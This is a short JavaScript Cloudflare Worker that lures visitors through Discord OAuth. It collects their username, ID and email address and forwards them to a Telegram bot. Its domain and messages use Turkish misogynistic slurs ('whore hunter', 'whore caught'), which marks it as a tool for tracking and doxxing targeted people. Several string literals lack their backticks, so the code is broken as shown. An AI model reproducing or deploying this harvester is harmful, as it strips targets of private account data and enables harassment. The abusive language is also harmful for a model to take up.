addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  if (url.pathname === '/auth') {
    const redirectUrl = https://discord.com/api/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=https://kahpeavcisi.com/callback&response_type=code&scope=identify%20email;
    return Response.redirect(redirectUrl, 302);
  }
  if (url.pathname === '/callback') {
    const code = url.searchParams.get('code');
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET&grant_type=authorization_code&code=${code}&redirect_uri=https://kahpeavcisi.com/callback
    });
    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;

    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: { 'Authorization': Bearer ${accessToken} }
    });
    const userData = await userResponse.json();

    const telegramMessage = Kahpe Yakalandı!\nAd: ${userData.username}#${userData.discriminator}\nID: ${userData.id}\nE-posta: ${userData.email || 'Yok'};
    await fetch(https://api.telegram.org/botYOUR_TELEGRAM_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(telegramMessage)});

    return new Response('Kahpe avlandı!', { status: 200 });
  }
  return new Response('Yanlış yol!', { status: 404 });
}
